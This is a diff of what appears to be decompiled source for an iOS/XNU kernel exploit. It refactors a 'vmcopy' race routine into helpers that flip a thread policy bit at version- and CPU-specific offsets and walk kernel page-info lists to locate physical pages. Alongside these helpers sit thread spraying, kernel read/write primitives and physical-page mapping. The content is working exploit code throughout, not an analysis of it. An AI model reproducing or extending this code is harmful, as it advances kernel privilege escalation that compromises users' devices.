@@ -173,6 +173,10 @@ enum
   VMCOPY_MESSAGE_KADDR_OFFSET = 664,
   VMCOPY_CAPTURED_THREAD_OFFSET = 672,
   VMCOPY_THREAD_SPRAY_COUNT = 256,
+  VMCOPY_POLICY_MARK_XNU_MIN = 8796,
+  VMCOPY_POLICY_MARK_DEFAULT_OFFSET = 184,
+  VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET = 112,
+  VMCOPY_POLICY_MARK_BIT = 0x8000,
   VMCOPY_MARKER32 = 0xC0C0C0C0u,
   VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
 };
@@ -334,6 +338,26 @@ static inline void vmcopy_spray_threads_and_clear_prev_link(
   }
 }
 
+static inline void vmcopy_mark_thread_policy_word_if_needed(
+        __int64 kreadCtx,
+        vm_address_t mappedThreadPage,
+        uint64_t threadKobject)
+{
+  struct_krwCtx *krwCtx = KRWCTX_FROM_RAW_FIELD(kreadCtx, 32);
+  bool useLegacyCpuOffset = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
+
+  if ( krwCtx->xnuMajorVersion < VMCOPY_POLICY_MARK_XNU_MIN )
+    return;
+
+  uint64_t fieldOffset = VMCOPY_POLICY_MARK_DEFAULT_OFFSET;
+  if ( useLegacyCpuOffset )
+    fieldOffset = VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET;
+
+  uint32_t *policyWord = (uint32_t *)(mappedThreadPage + (threadKobject & 0x3FFF) + fieldOffset);
+  if ( (*policyWord & VMCOPY_POLICY_MARK_BIT) == 0 )
+    *policyWord |= VMCOPY_POLICY_MARK_BIT;
+}
+
 static inline void vmcopy_prepare_fake_thread_state(
         __int64 state,
         natural_t suspendedThreadState[0x44],
@@ -460,6 +484,25 @@ static inline uint64_t vmcopy_page_info_ref_from_addr(uint64_t addr, uint64_t pa
   if ( addr >= packedBase )
     return ((addr - packedBase) / 48) | 0x80000000u;
   return (addr - linearBase) >> pageShift;
+}
+
+static inline uint64_t vmcopy_find_page_info_for_physical(
+        __int64 kreadCtx,
+        uint32_t firstRef,
+        uint64_t packedBase,
+        uint64_t linearBase,
+        uint32_t pageShift,
+        uint64_t physicalBase)
+{
+  uint64_t pageInfo = vmcopy_page_info_addr_from_ref(firstRef, packedBase, linearBase, pageShift);
+
+  while ( kread_u64_value(kreadCtx, pageInfo + 24) != physicalBase )
+  {
+    uint32_t nextRef = kread_u32_value(kreadCtx, pageInfo + 8);
+    pageInfo = vmcopy_page_info_addr_from_ref(nextRef, packedBase, linearBase, pageShift);
+  }
+
+  return pageInfo;
 }
 
 static inline __int64 physmap_find_free_vm_region(vm_size_t requiredSize, vm_address_t *baseOut, vm_size_t *sizeOut)
@@ -8031,16 +8074,9 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   __int64 v47; // x8
   __int64 v48; // x28
   int v54; // w8
-  struct_krwCtx *v55; // x0
-  int v56; // w22
-  int v57; // w0
-  __int64 v58; // x9
-  unsigned __int64 v59; // x9
-  int v60; // w10
   unsigned int v63; // w0
   unsigned __int64 v64; // x22
   unsigned __int64 v65; // x25
-  unsigned int v66; // w0
   unsigned __int64 v67; // x8
   __int64 v68; // x22
   __int64 v69; // x0
@@ -8286,30 +8322,13 @@ LABEL_68:
       v54 = 87;
       continue;
     }
-    v55 = KRWCTX_FROM_RAW_FIELD(*v2, 32);
-    v56 = v55->xnuMajorVersion;
-    v57 = krw_ctx_has_flag(v55, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
-    if ( v56 >= 8796 )
-    {
-      v58 = 184;
-      if ( v57 )
-        v58 = 112;
-      v59 = v58 + (v23 & 0x3FFF);
-      v60 = *(uint32_t *)(v59 + v152);
-      if ( (v60 & 0x8000) == 0 )
-        *(uint32_t *)(v152 + v59) = v60 | 0x8000;
-    }
+    vmcopy_mark_thread_policy_word_if_needed(*v2, v152, v23);
     vmcopy_spray_threads_and_clear_prev_link(*v2, &v154, VMCOPY_THREAD_SPRAY_COUNT);
     kwrite_u64_to_addr(*v2, v23 + qword_48008 - 8, v100);
     kwrite_u64_to_addr(*v2, qword_48008 + v23, v96);
     v63 = kread_u32_value(*v2, v20);
     v64 = v106;
-    v65 = vmcopy_page_info_addr_from_ref(v63, v109, v106, v159);
-    while ( kread_u64_value(*v2, v65 + 24) != v108 )
-    {
-      v66 = kread_u32_value(*v2, v65 + 8);
-      v65 = vmcopy_page_info_addr_from_ref(v66, v109, v64, v159);
-    }
+    v65 = vmcopy_find_page_info_for_physical(*v2, v63, v109, v106, v159, v108);
     v67 = vmcopy_page_info_ref_from_addr(v65, v109, v64, v159);
     v99 = v67;
     v144 = vmcopy_map_physical_page(
